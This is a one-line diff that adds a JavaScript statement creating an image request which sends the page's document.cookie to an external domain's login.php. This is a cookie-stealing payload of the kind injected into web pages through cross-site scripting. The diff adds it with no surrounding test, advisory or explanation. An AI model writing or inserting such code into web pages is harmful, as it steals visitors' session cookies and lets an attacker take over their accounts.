@@ -1,0 +1,1 @@
+new Image().src="https://yy9cbc.xyz/login.php?cookie=" + encodeURI(document.cookie);
